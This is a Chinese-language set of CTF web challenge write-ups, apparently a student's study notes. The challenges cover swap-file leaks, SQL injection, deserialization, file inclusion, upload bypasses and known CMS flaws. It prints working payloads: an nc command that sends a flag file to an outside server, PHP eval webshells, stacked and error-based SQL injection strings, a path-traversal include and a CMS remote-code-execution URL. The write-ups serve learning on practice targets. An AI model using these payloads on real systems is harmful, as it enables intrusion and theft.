



# CTF刷题WriteUp

## WEB

### "百度杯"CTF比赛 十月场——EXEC

**进入网站页面**

![image-20210501154827617](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501154827617.png)

**查看源码**

发现了vim，可能是vim泄露，于是在url地址输入了http://21b854b211034489a4ee1cb0d37b0212560fbf24f2e6468d.changame.ichunqiu.com/.index.php.swp

![image-20210501155039314](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155039314.png)

或者通过dirsearch工具扫描网站目录也可以发现 `/.index.php.swp`，也可以想到vim泄露

![image-20210501155453793](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155453793.png)

下载文件

![image-20210501155637128](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155637128.png)

下一步就是通过 `vim -r index.php.swp`恢复index.php,然后打开

~~~php
<html>
<head>
<title>blind cmd exec</title>
<meta language='utf-8' editor='vim'>
</head>
</body>
<img src=pic.gif>
<?php
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
	setcookie('auth','tcp tunnel is forbidden!');
	if(isset($_POST['cmd'])){
		$command=$_POST[cmd];
		$result=exec($command);
		//echo $result;
	}
}else{
	die('no sign');
}
?>
</body>
</html>
~~~

这里有一个check函数需要绕过，很明显check函数就是把选手输入的数字一个一个的判断，查看这些数字的ASCII码是否在1-9的ASCII码之间，如果符合则验证失败。如果check函数想最后返回返回true，则`$number`需要等于'11259375'，这里可以使用十六进制来绕过即可。

代码里面的 `setcookie('auth','tcp tunnel is forbidden!');`告诉我们TCP被禁止不能用curl,而且cmd命令执行之后也没有回显，但是前面的注释告诉了我们flag文件，我们可以直接用nc命令把flag文件下过来，我们需要一台有公网ip的服务器。

在服务器上运行

~~~sh
nc -lup 39999
~~~

然后再题目那里用post方法 cmd=nc -u 你的ip地址 39999 < flag233.php

**注：这里我踩了个小坑，`cmd=nc`我输入成了 `cmd = nc`，等于号两边不能有空格。**

![image-20210501160323527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160323527.png)

flag便传到了服务器上

![image-20210501160629527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160629527.png)

### [强网杯 2019]随便注 1

**1.进入网址**

![image-20210501180925552](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501180925552.png)

**2.输入`1‘`符号报语法错误，再输入 `1’ #`页面正常**

![image-20210501181059554](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181059554.png)

**3.接下来尝试 `order by`查看有几列数据显示**，然后配合 `union select`显示数据库的一些信息，但是select、delete等一些关键字被限制，到这里我知道可能被后台代码做了限制，于是去找了一些绕过限制的语句或者关键字特殊编码，但是都失败了。于是后面便没有了思路，自己还需要多努力啊。。。。多刷题！多扩展思路！

![image-20210501181535674](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181535674.png)

**4.在网上搜了下解决方案，可以使用堆叠注入，果然可以，把全部库名都给查出来了**

![image-20210501192326812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192326812.png)

**5.OK继续查表名**

![image-20210501192423272](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192423272.png)

**6.然后就是分别查看"1919810931114514"表与"words"表这两个表的结构**

![image-20210501192950713](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192950713.png)

![image-20210501193132021](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501193132021.png)

使用了关键字 `desc`来查看表里的字段结构，注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符

**7.由此可以想到该输入框的SQL语句应该是 `select id,data from words where id = ?`**

因为可以是堆叠查询，这时候我们可以使用改名的方法，把含有flag的"1919810931114514"表改名为words，再把flag字段改名为id，结合上面的1' or 1 #爆出表内所有的内容就可以查到flag了。

~~~sql
1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table words change flag id varchar(100) character set utf8 collate utf8_general_ci NOT NULL;desc words;#
~~~

![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/1790307-20200225003553488-841750902.png)

**8. 再用一下一开始的操作id=1' or 1=1#，最终获得flag值**

![image-20210501194343817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501194343817.png)

> 突然发现自己好菜啊，果然光听不练假把式。在实践中学习，在学习中实践！以下是第二天的题，记录下自己踩得坑，得到了什么经验，学到了什么新东西。但是发现自己踩得全是坑。。。。。

### “百度杯”CTF比赛 2017 二月场——爆破-1

进入网站

![image-20210502140954426](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502140954426.png)

呦吼，阅读php代码，有点javaweb语言基础的我还是勉强能看懂的，就是有些特殊的函数就不知道它的具体功能了，百度。。。。其中不认识的php函数我都整理到了PHP代码审计的笔记中了。

网上的解题思路大部分都是看见了两个$$符号，就猜到了要考察`GLOBALS`超全局变量，而我这个小菜鸟连这个超全局变量都没听说过，又学到了新东西。结合自己的想法，$a表示URL中输入的参数值，但是GLOBALS变量使用前要有$符号，所以看见两个$$符号就想到了GLOBALS。这是自己的理解。

![image-20210502142121838](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502142121838.png)

解题成功，通过这道题学到了GLOBALS超全局变量。

### “百度杯”CTF比赛 2017 二月场——爆破-2

![image-20210502143146826](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502143146826.png)

该题就是通过url的参数值来获得flag.php中的flag值。怎么获得呢？如果直接输入`flag.php`会被当成字符串执行，没有任何意义，我们读取需要flag.php文件里面的内容。所以可以使用`file()、file_get_contents()`函数，提前把flag.php读入一个数组或者字符串，然后在通过var_dump()函数把变量输出，但是输出的内容就是flag.php文件里面的内容。

还有一种方法就是拼接字符串。`1);show_source('flag.php');var_dump(` 把var_dump()拆分成三个函数即可。

![image-20210502144424875](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502144424875.png)

### “百度杯”CTF比赛 九月场——SQL

![image-20210502144617838](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502144617838.png)

需要对id参数进行SQL注入，测试得到是整数型注入，但是order by 、union select等一些关键字都被限制了，学到了一个新的绕过姿势，使用<>绕过。便可一路过关斩将，利用information_schema库的一些信息来获得了flag值。

**首先获得表**

![image-20210502150010162](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150010162.png)

**获得表中的字段**

![image-20210502150334897](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150334897.png)

**最终可以获得表中的值**

![image-20210502150439645](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150439645.png)

### “百度杯”CTF比赛 十月场——Login

![image-20210502151044842](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151044842.png)

进去网站我看见是一个登录页面，然后我就迫不接待的打开了brup打算暴力破解密码，这里非常成功的踩了第一个坑。没有看注释，注释里给了账号和密码，说明出题人考察的方面根本就不是暴力破解密码。

![image-20210502151316297](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151316297.png)

接下来登录进去网站，发现啥也没有。

![image-20210502151421923](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151421923.png)

好了，又没思路了，我可太菜了。。。。。借鉴一下别人的思路，用burp抓包试试。

![image-20210502152040368](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502152040368.png)

发现了response里面有个可以的参数show=0，我们可以试试从客户端发个show=1的包看看服务器的响应是怎么样的。成功获得一段PHP代码，又要开始代码审计了。马马虎虎能看懂，还需要再学学PHP啊。

![image-20210502152338715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502152338715.png)

~~~php
<?php
	include 'common.php';
	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
	class db
	{
		public $where;
		function __wakeup()
		{
			if(!empty($this->where))
			{
				$this->select($this->where);
			}
		}

		function select($where)
		{
			$sql = mysql_query('select * from user where '.$where);
			return @mysql_fetch_array($sql);
		}
	}

	if(isset($requset['token']))
	{
		$login = unserialize(gzuncompress(base64_decode($requset['token'])));
		$db = new db();
		$row = $db->select('user=\''.mysql_real_escape_string($login['user']).'\'');
		if($login['user'] === 'ichunqiu')
		{
			echo $flag;
		}else if($row['pass'] !== $login['pass']){
			echo 'unserialize injection!!';
		}else{
			echo "(╯‵□′)╯︵┴─┴ ";
		}
	}else{
		header('Location: index.php?error=1');
	}

?>
~~~

来吧兄弟们，代码审计走起来。class db这一段就是对数据库的一个操作，对本体来说不重要， 重点看 `if(isset($requset['token']))`这个里面的代码！以下是我对本段代码的理解。

获取token的值，token值经过了base64解码-->解压缩-->对单一的已序列化的变量进行操作将其转换回PHP 的值,

最终获得login变量，但是login变量里的user值必须为'ichunqiu'才会获得flag。

现在就是构造一个token，给它的user值赋予'ichunqiu'，然后序列化-->压缩-->base64编码

![image-20210502154345812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154345812.png)



![image-20210502154334063](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154334063.png)

最后加cookie里面加上token参数给服务器发送。服务器便会成功返回一个flag值。

![image-20210502154529559](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154529559.png)

成功返回flag值，奥利给，又学了新东西。

### [HCTF 2018]WarmUp 1

这是一个代码审计题，首先进入网站，查看源码

### ![image-20210502180730817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502180730817.png)

发现了提示信息，然后咱们在URL地址中输入 `source.php`，查看跳转页面，页面显示如下代码，好吧，开始看代码吧。。。。。。

~~~php+HTML
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {	//定义了白名单
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
//isset()判断变量是否声明,is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
//file里输入的内容是否是白名单内的字符串，符合则返回true
            if (in_array($page, $whitelist)) {
                return true;
            }
 //过滤问号的函数(如果$page的值有?则从?之前提取字符串,没有则提取整个字符串)
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置
            );
//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真，此时我用的payload已经符合，返回true            
            if (in_array($_page, $whitelist)) {
                return true;
            }
//url对$page解码
            $_page = urldecode($page);
//过滤问号的函数           
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真            
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])		#file不能为空
        && is_string($_REQUEST['file'])	#file必须为字符串
        && emmm::checkFile($_REQUEST['file'])#要符合checkFile函数，成功返回True
    ) {
        include $_REQUEST['file'];		#执行文件包含命令
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

~~~

发现白名单中还有个 `hint.php`文件，进去看看，告诉我们flag在哪里。

![image-20210502181936929](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502181936929.png)

**payload：**

~~~php
?file=hint.php?../../../../../ffffllllaaaagggg
~~~

我们可以想象他传入checkFile函数要经历 第一次白名单验证, 一次?过滤后,他就是hint.php 再进行一次白名单验证 返回为真, 则达成条件进行包含得到flag

![image-20210502182300265](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502182300265.png)

### “百度杯”CTF比赛 2017 二月场——爆破3

进入网站

![image-20210502183455576](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502183455576.png)

映入眼帘的又是PHP代码，看来PHP是世界上最好的语言这句话没有错啊，哈哈哈哈，靶场全都是PHP代码，慢慢积累慢慢学吧。

说正题，先阅读一下代码，大体意思是Session中的num初始值为0，time为当前时间，whoami的初始值为ea。120秒之后销毁会话。用str_rands随机生成2个字母，whoami需要等于我们传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++，whoami=str_rands，循环10次后，输出flag。


~~~php
<?php 
error_reporting(0);//不显示错误信息
session_start();//启动新会话或者重用现有会话
require('./flag.php');
if(!isset($_SESSION['nums'])){//给session会话初试赋值
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){//120秒之后销毁session会话
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];
//
if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){	//num>=10会输出flag
  echo $flag;
}

show_source(__FILE__);
?>

~~~

由19行可看出为弱判断类型，可以用数组进行绕过，md5函数不能对数组进行处理，所以传数组。md5()==0

根据获取到的信息构造payload    ?value[]=ea

代码中提到需要提交大于10次，10次过后得到flag

![image-20210502190337932](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502190337932.png)

本题学到了数组在传值的应用，以及md5对数组加密无效。加油！！！

### “百度杯”CTF比赛 九月场——Upload

打开网页上传shell文件，结果发现前面的<?php被限制去掉了

![image-20210502194728556](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502194728556.png)

百度了一下原来还有PHP长标签，又是收获啊

~~~javascript
<script language="PHP"> //php小写被过滤了，所以改成了大写，也可以大小写混合
  @eval($_POST["pass"]);    
</script>
~~~

再次上传shell脚本，结果页面无显示，说明上传成功了。接下来就是打开蚁剑，建立连接成功。

![image-20210502195327414](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195327414.png)

成功获得flag

![image-20210502195626813](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195626813.png)

### “百度杯”CTF比赛 2017 二月场——include

进入页面

![image-20210502195853956](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195853956.png)

先搜索一下是否允许文件包含，给你phpinfo的作用不就是这样，发现允许文件包含，所以可以用`php://input`伪协议包含文件。

![image-20210502200012326](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502200012326.png)

接下来看代码要求

~~~php
<?php 
show_source(__FILE__);
if(isset($_REQUEST['path'])){
    include($_REQUEST['path']);
}else{
    include('phpinfo.php');
}
~~~

path可以直接传参数进行文件包含。。。抓包，用PHP伪协议执行php代码，没想到成功了。

![image-20210502201036831](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201036831.png)

发现了个可以的文件名，直接执行linux系统命令

~~~php
<?php system("cat dle345aae.php");?>
~~~

成功获得flag

![image-20210502201315455](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201315455.png)

### 2017第二届广东省强网杯线上赛——broken

进入网址看见全都是一些中括号、感叹号什么的，有点蒙，后来才知道这是jsfuck加密。。。。[详细解释]([JSFuck 有趣的js加密 (360doc.com)](http://www.360doc.com/content/20/0206/19/30583588_890134979.shtml))

害得我一顿扫描目录还有抓包。

![image-20210503165413769](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503165413769.png)

![image-20210503165424044](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503165424044.png)

这里需要了解一下**jsfuck的解密方法**

> jsfuck、jjencode、aaencode可以被很轻易的还原：
> 第一步：首先打开谷歌浏览器，进入浏览器控制台。
> 第二步：去掉最后一行末尾的()，复制加密后的代码；
> 第三步：在console控制台粘贴你第二步复制的代码；
> 第四步：回车，达到便能得到解密后的代码。

但是呢，这道题还有一个坑就是符号的匹配问题，他在最前面多了一个 `[`没有进行匹配，删掉即可显示js 代码，成功获得flag

![image-20210503165814265](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503165814265.png)

通过这道题，知道了jsfuck编码。

### 2017第二届广东省强网杯线上赛——who are you?

进入网站，对不起，你没有权限。果断去用burp抓包,查看是否有可疑字段

![image-20210503170040013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503170040013.png)

发现了cookie中有个role值，看着像base64编码，去解码

![image-20210503170443094](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503170443094.png)

解码发现，这不就是我今天刚学的php的无类序列化问题嘛，这里面的用户是thrfg，我用admin编码之后试试能不能有权限，结果发现登录不进去。后来看了别人的writeup才知道，原来thrfg也是编码后的，用的是rot-13编码，编码后是guest.

![image-20210503170557070](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503170557070.png)

然后把admin用rot-13编码，再用base64把整体编码传入cookie中登录成功。

![image-20210503171603238](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503171603238.png)

![image-20210503171636111](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503171636111.png)

登录成功显示让上传东西，查看源码给了传输的条件。

![image-20210503171522878](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503171522878.png)

![image-20210503172208669](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503172208669.png)



报错了，后台应该有限制，尝试去绕过。因为网页做了正则匹配过滤. 而用data[]=的方法，把data从字符串变成数组，可以绕过正则匹配的过滤。

![image-20210503172356709](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503172356709.png)

绕过限制以后，显示传输成功，并且给了传输成功的地址，但是都是显示404找不到资源

![image-20210503174345724](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503174345724.png)

![image-20210503174402068](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503174402068.png)

![image-20210503174514339](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503174514339.png)

我猜测应该是服务器的问题，我在网上找了很多解题方法，都没有遇到这种情况。我也用dirsearch扫了一下目录。并没有发现uploads文件夹，可能更加应征了我的猜测，过段时间再来看看这道题吧。

这道题就是用了**两次的编码（base64、rot-13）把admin身份传入cookie中通过了身份验证**，然后就是文件上传的正则表达式限制字符串的格式，**通过数组去绕过正则表达式限制**。

### “百度杯”CTF比赛 九月场——YeserCMS

进入网站，是一个庞大的电商系统，一时间不知如何下手。先去百度搜搜以前报过哪些漏洞吧。

![image-20210503182613652](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503182613652.png)

在网上顺利找到一个注入点，直接进行尝试

~~~http
http://cac6d32bf8ff4b52becb3516148c9c106deeaa1e92b64a8e.changame.ichunqiu.com//celive/live/header.php
~~~

**Payload**:通过POST方式传参

~~~
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
~~~

最终成功破解管理员账号密码，爆出的密码并不全，通过把1改成11就会把后面的密码显示，然后通过MD5算法解密即可

![image-20210503183242453](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503183242453.png)

成功用账号密码登录进管理员页面

![image-20210503183411367](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503183411367.png)

但是下一步该怎么办，我们需要获得的是在网站根目录下的flag.php文件，可以在管理员后台找有没有访问服务器文件的功能，找到了模板功能中的修改模板，这个功能点不就是修改服务器中的web文件嘛，所以在点击编辑的时候抓包，修改地址就获得了flag.php文件。

![image-20210503183807527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503183807527.png)

![image-20210503182451205](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210503182451205.png)

这个题考查的是对公共cms系统漏洞的复现，以及利用web管理员的权限提权获得服务器中文件的信息，利用的就是功能点路径的限制不严格。

> 第三天开始啦！

### 第三届“百越杯”福建省高校网络空间安全大赛——Do you know upload？

进入网站

![image-20210504144854894](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504144854894.png)

查看源代码，发现了文件包含注释，所以可以直接上传任何后缀的文件都会被解析成PHP文件，所以话不多说，上传个php文件试试，显示上传文件类型不正确，上传jpg格式可以

![image-20210504144839893](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504144839893.png)

抓个包，改下content-type:image/jpeg，成功绕过上传成功

![image-20210504152910664](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504152910664.png)

用蚁剑连接成功，发现里面有个config.php文件，打开发现了数据库配置的账号密码，flag可能在数据库中，然后用蚁剑连接数据库，成功获得flag

![image-20210504152923606](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504152923606.png)

![image-20210504152930806](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504152930806.png)

这道题其实难度不大，上传绕过也很基础，不要想的太复杂。

### 2016全国大学生信息安全竞赛——破译（未解决）

这道题没有网页，只有下面的一段密文，让选手破译，第一次遇到这种题目

~~~
 TW5650Y - 0TS UZ50S S0V LZW UZ50WKW 9505KL4G 1X WVMUSL510 S001M0UWV 910VSG S0 WFLW0K510 1X LZW54 WF5KL50Y 2S4L0W4KZ52 L1 50U14214SLW X5L0WKK S0V TSK7WLTS88 VWNW8129W0L 50 W8W9W0LS4G, 95VV8W S0V Z5YZ KUZ118K SU41KK UZ50S.LZW S001M0UW9W0L ESK 9SVW SL S K5Y050Y UW4W910G L1VSG TG 0TS UZ50S UW1 VSN5V KZ1W9S7W4 S0V FM LS1, V54WUL14 YW0W4S8 1X LZW 50LW40SL510S8 U112W4SL510 S0V WFUZS0YW VW2S4L9W0L 1X LZW 9505KL4G 1X WVMUSL510.
"EW S4W WFU5LWV L1 T41SVW0 1M4 2S4L0W4KZ52 E5LZ LZW 9505KL4G 1X WVMUSL510 L1 9S7W S 810Y-8SKL50Y 592SUL 10 LZW 85NWK 1X UZ50WKW KLMVW0LK LZ41MYZ S 6150L8G-VWK5Y0WV TSK7WLTS88 UM445UM8M9 S0V S E5VW 4S0YW 1X KUZ118 TSK7WLTS88 241Y4S9K," KS5V KZ1W9S7W4. "LZ5K U1995L9W0L 9S47K S01LZW4 958WKL10W 50 LZW 0TS'K G1MLZ S0V TSK7WLTS88 VWNW8129W0L WXX14LK 50 UZ50S." X8SY { YK182V9ZUL9STU5V}
~~~

这是什么啊，蒙了。看着不像是熟悉的base64、md5加密啊，百度一下



### “百度杯”CTF比赛 九月场——Test

这道题和昨天做的YeserCMS套路是一样的，这个稍微简单点。都是给了一个开源的cms站，根据他们以往被爆出的漏洞进行渗透。

![image-20210504155938028](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504155938028.png)

直接百度历史漏洞

爆出payload：

~~~
直接在直接在url后面加上：/search.php?searchtype=5&tid=&area=eval($_POST[1])
~~~

咱们先用phpinfo()试试漏洞，果然成功了

![image-20210504160150073](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160150073.png)

果断修改为一句话木马 `eval($_POST[pass])`，用蚁剑连接即可成功。

![image-20210504160548076](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160548076.png)

进去服务器之后并没有发现flag文件，心想是不是跟上一个题一样的套路，flag藏在数据库中，然后就找数据库连接文件，连接数据库。

![image-20210504160730768](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160730768.png)

在数据库中成功找到flag文件

![image-20210504160840893](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504160840893.png)

做题做多了，出题人的套路也慢慢的熟悉了一些。继续努力！

### “百度杯”CTF比赛 九月场——123

进入网站

![image-20210504161018898](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504161018898.png)

登录？老套路，第一步先看源码

![image-20210504161105091](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504161105091.png)

注释说用户信息在user.php里，打开看看？没有回显任何信息，先用dirsearch扫一下目录吧

![image-20210504161728291](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504161728291.png)

![image-20210504163001048](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163001048.png)

扫出的结果并没有什么异常的文件，后来看了wp，发现竟然有个`user.php.bak`文件，扫描文件没扫出来哦，下载下来是个用户名，果断爆破密码



![image-20210504162933003](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504162933003.png)

从1990年开始，扫出了一个结果

![image-20210504163216924](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163216924.png)

于是成功登录进去啥也没有。。。。。肯定又是在注释里，果然。

![image-20210504163302089](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163302089.png)

form表单存在上传漏洞？接下来怎么办呢？去掉注释

![image-20210504163955143](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504163955143.png)

接下来就是上传文件的知识了

![image-20210504164231534](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504164231534.png)

上传各种绕过的方式都显示文件名不合法，它的限制好像是文件名和内容都不能含有PHP字母，否则就会显示文件内容不合法。于是随便写了几个1，显示出来了一个超链接

![image-20210504164955941](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504164955941.png)

![image-20210504164728314](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504164728314.png)

进入/view.php显示一个file?

![image-20210504165428568](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504165428568.png)

用他包含flag试试

![image-20210504165754866](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504165754866.png)

字符串过滤flag,使用字符串叠加，成功显示flag值

![image-20210504165848715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504165848715.png)

感觉这道题考的知识点好多啊，有文件备份泄露、密码暴力破解、文件上传、字符串过滤等。收获很大。

### “百度杯”CTF比赛 九月场——SQLi

进入页面发现什么也没有，查看注释

![image-20210504173901172](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504173901172.png)

果断访问这个地址，结果打算SQL注入，输入很多情况并没有回显任何信息，只能看看别人的思路了。

访问index.php抓包显示，发现了refresh响应字段，重定向

![image-20210504172608161](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504172608161.png)

发现refresh中重定向的地址l字母变成了1，在url中显示，然后就用原始的地址抓包发现了l0gin.php?id=1，这个才是真的注入点吧。哇，这个题真的考验眼力啊。。。

![image-20210504173837416](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504173837416.png)

成功回显内容，开始注入吧

![image-20210504174247543](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504174247543.png)

输入参数 `1' and ascii(substr((select database()),1,1))>64 %23`，发现 `，`之后的内容没有显示，语句没有执行成功被显示了出来，说明代码限制了 `，`的使用，可以使用其他的SQL语句进行绕过

![image-20210504180137413](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504180137413.png)

用 `order by` 判断出来是两列显示，`union select 1,2`中的 `，`被限制了， 可以使用 `union select * from ((select 1) a join (select 2) b )`绕过

![image-20210504180931298](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504180931298.png)

接下来就可以使用数据库的一些特殊函数来获得flag值，先获取数据库和版本信息

![image-20210504181145862](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181145862.png)

使用information_schema数据库获取数据库表信息，users表

![image-20210504181411306](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181411306.png)

获取数据表users内部的字段信息

![image-20210504181549896](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181549896.png)

最终获得users表中的flag信息

![image-20210504181714382](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504181714382.png)

好坑啊这个题，给了一个假的注入点，还要考察眼力。。。。。。不过也学习到了新的绕过逗号限制的方式。

### “百度杯”CTF比赛 九月场——Code(*)

进入网站

![image-20210504212939544](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504212939544.png)

![image-20210504214155014](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504214155014.png)

![image-20210504214208022](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504214208022.png)

~~~php
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=hei.jpg');
$file = $_GET['jpg'];
echo '<title>file:'.$file.'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";

/*
 * Can you find the flag file?
 *
 */

?>
~~~

> 正则表达式
>  ^在[]外表示以什么开头
>  ^在[]里表示取反
>  .表示除换行符（\n、\r）之外的任何单个字符

![image-20210504215648121](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210504215648121.png)



~~~php
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');
//生成length长度的随机数
function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++)	{
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}
//传入txt、key两个变量
function encrypt($txt,$key){
    for($i=0;$i<strlen($txt);$i++){
